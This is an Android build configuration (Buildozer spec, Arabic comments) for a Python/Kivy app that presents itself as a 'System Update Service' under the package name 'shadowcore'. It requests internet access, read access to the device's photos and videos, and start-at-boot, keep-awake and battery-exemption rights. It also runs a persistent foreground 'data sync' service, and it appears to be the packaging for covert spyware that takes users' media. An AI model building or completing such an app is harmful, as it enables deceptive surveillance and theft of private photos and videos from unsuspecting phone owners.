[app]
title = System Update Service
package.name = shadowcore
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.95

# المتطلبات الضرورية
requirements = python3,kivy,requests,urllib3,certifi,idna,chardet,android,pyjnius

orientation = portrait

# صلاحيات أندرويد 14 والخدمات الخلفية
android.permissions = INTERNET, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC, WAKE_LOCK, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POST_NOTIFICATIONS, RECEIVE_BOOT_COMPLETED

android.api = 34
android.minapi = 24
android.ndk = 25b
android.private_storage = True

# تعريف الخدمة - (مهم جداً)
services = Myservice:service.py
android.services_type = Myservice:foreground_service

android.archs = arm64-v8a
android.copy_libs = 1

[buildozer]
log_level = 2
warn_on_root = 1
